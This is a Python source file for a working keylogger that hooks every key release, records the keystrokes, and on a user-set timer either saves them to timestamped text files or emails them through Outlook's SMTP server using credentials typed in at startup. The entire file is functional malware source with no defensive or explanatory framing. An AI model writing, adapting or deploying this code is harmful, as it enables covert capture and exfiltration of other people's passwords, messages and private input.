import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

valid = 0

reportTimer = int(input("time between reports (in seconds) > "))

while valid == 0:
    repMethod = input("email or file? > ")
    if repMethod == 'email' or repMethod == 'file':
        valid += 1
    else:
        print('Wrong answer, please type correctly')


class Keylogger:
    def __init__(self, interval, method):
        self.interval = interval
        self.method = method
        self.log = ""
        self.startDt = datetime.now()
        self.endDt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name == "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def updateFilename(self):
        startDtStr = str(self.startDt)[:-7].replace(" ", "-").replace(":", "")
        endDtStr = str(self.endDt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startDtStr}_{endDtStr}"

    def reportToFile(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def prepEmail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()

    def sendMail(self, mail, password, message, verbose=1):
        '''context = ssl.create_default_context()
        with smtplib.SMTP("smtp.office365.com", 587) as server:
            server.ehlo()
            server.helo()
            server.starttls()'''
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, mail, self.prepEmail(message))
        server.quit()

        if verbose:
            print(f"{datetime.now()} - Sent as email to {email} containing {message}")

    def report(self):
        if self.log:
            self.endDt = datetime.now()
            self.updateFilename()

            if self.method == "email":
                self.sendMail(email, passwd, self.log)
            elif self.method == "file":
                self.reportToFile()

            print(f"[{self.filename}] - {self.log}")
            self.startDt = datetime.now()

        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.startDt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogging")
        keyboard.wait()


if __name__ == "__main__":
    if repMethod == 'email':
        email = input("Your email (Outlook): ")
        passwd = input("Your password (Outlook): ")
        keylogger = Keylogger(interval=reportTimer, method='email')
        keylogger.start()
    elif repMethod == 'file':
        keylogger = Keylogger(interval=reportTimer, method='file')
        keylogger.start()
